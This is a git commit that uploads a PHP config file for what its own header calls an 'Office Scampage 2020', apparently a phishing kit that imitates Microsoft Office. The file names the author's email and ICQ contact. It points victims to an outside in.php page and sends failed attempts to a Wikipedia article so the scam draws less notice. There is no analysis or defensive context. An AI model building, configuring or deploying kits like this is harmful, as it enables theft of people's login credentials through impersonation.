4e8a6c280f9ce0be47618cd8e37a4c038288a105
ceecraston <98389504+ceecraston@users.noreply.github.com>
2022-01-25 04:36:12 -0600

    Add files via upload

---
+++ config.php
@@ -0,0 +1,11 @@
+<?php
+/* 
+Office Scampage 2020 by Shooter
+Email: m20.shooter@gmail.com
+ICQ: 753131003
+*/
+
+$pagelink="https://www.voyvoz.com/ticket/in.php";
+$FailRedirect="https://www.wikipedia.org/wiki/Microsoft_Office";
+$redirecttype="2";// 1:header - 2:script
+?>
